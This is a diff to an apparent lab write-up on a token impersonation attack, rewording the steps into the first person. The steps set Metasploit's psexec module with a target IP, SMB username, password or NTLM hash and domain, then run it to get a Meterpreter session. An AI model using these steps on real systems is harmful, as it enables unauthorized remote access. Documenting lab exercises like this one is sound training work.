@@ -241,7 +241,7 @@ View the full module info with the info, or info -d command.
 
 ### Step 1.5: Setting Required Options
 
-Before running the exploit, need to configure the target and login details.
+Before running the exploit, I set the target machine and login details in Metasploit.
 
 ```bash
 set RHOSTS 192.168.5.142
@@ -256,14 +256,6 @@ set SMBDomain readteambd.local
 * **SMBUSER** → Username used to log in
 * **SMBPASS** → Password or NTLM hash for authentication
 * **SMBDomain** → Domain name of the target environment
-
-**Purpose:**
-
-These values tell Metasploit:
-
-* which machine to attack
-* which credentials to use
-* how to authenticate to the target system
 
 **Output:**
 
@@ -287,7 +279,7 @@ msf exploit(windows/smb/psexec) >
 
 ### Step 1.6: Get Meterpreter Session
 
-Now just run the following command & get meterpreter session
+After setting everything, I ran the exploit to get a session on the target machine.
 
 ```bash
 run
@@ -308,6 +300,7 @@ msf exploit(windows/smb/psexec) > run
 
 meterpreter >
 ```
+After this, I successfully got a Meterpreter session on the target system.
 
 <p align="center">
   <img src="/writeups/token impersonation attack/images/step1 1.6.png" width="600">
